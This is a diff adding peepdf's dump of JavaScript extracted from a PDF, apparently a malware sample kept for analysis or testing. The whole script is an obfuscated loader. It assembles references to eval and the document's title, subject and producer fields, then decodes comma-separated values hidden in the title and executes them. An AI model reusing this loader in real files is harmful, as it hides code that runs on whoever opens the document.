@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [(test) <</S /JavaScript
+/JS (
+Muhwe='';
+QadyfeDexakhyj=2011;
+var j = QadyfeDexakhyj-2007;
+PomePytedycikizonuqu='2011s'.replace(QadyfeDexakhyj,'hi');
+QfofvacipopAkijo=('.tit2011').replace(QadyfeDexakhyj,'le');
+eval('VitUv=t'+PomePytedycikizonuqu+QfofvacipopAkijo);
+KfeNak=('sub2011').replace(QadyfeDexakhyj,'ject');
+eval('VilaZrah=t'+PomePytedycikizonuqu+'.'+KfeNak);
+VilaZrah=VilaZrah.replace(QadyfeDexakhyj,'al');
+eval('TsojigaRumovucagi=t'+PomePytedycikizonuqu);
+eval('SpupuzozuLufucivy=TsojigaRumovucagi[VilaZrah]');
+JywisyKfembanuqiboc='.pro2011cer';
+JywisyKfembanuqiboc=SpupuzozuLufucivy('JywisyKfembanuqiboc.replace(QadyfeDexakhyj,"du")');
+eval('GehoZapajiu=t'+PomePytedycikizonuqu+JywisyKfembanuqiboc);
+ByzejyhijyxyxovIrnp=SpupuzozuLufucivy(GehoZapajiu);
+CohinjiEhe = VitUv.split(',');
+for (MylErafaxoty = 0; MylErafaxoty < CohinjiEhe.length; MylErafaxoty++) {
+	KiqizvovavyhAzudimoq = SpupuzozuLufucivy(CohinjiEhe[MylErafaxoty]);
+	Muhwe += ByzejyhijyxyxovIrnp(KiqizvovavyhAzudimoq);
+}
+SpupuzozuLufucivy(Muhwe);
+
+)
+>>]
+>>
+
